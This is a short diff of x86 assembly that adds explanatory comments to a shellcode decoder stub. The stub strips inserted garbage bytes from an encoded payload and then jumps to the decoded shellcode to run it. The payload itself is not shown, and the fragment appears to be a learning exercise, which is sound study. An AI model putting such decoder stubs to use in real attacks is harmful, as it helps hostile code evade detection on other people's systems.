@@ -16,17 +16,17 @@ _start:
 
 step2:
         pop edi ; retrieves the address of Shellcode
-		xor eax, eax
-		xor ebx, ebx
-		xor edx, edx
+		xor eax, eax ; set register to zero
+		xor ebx, ebx ; set register to zero
+		xor edx, edx ; set register to zero
 		xor ecx, ecx ; assigns 0x00 to ECX
         mov cl, 0x32 ; assigns 50 to ECX
 		
 decode:
-		mov dl, [edi+ebx] 
-		mov byte [edi+eax], dl
-		inc al
-		add bl, 0x02
+		mov dl, [edi+ebx] ; copy EDI+EBX to DL
+		mov byte [edi+eax], dl ; copy the value in DL to EDI+EAX, these two lines effectively shift the byte, overwriting the encoded 'garbage byte'
+		inc al ; increment AL by 1
+		add bl, 0x02 ; increment BL by 2
         loop decode ; continue with the loop (jumps back to decode)
 
         jmp Shellcode ; with the shellcode now fully decoded, jump to it for execution
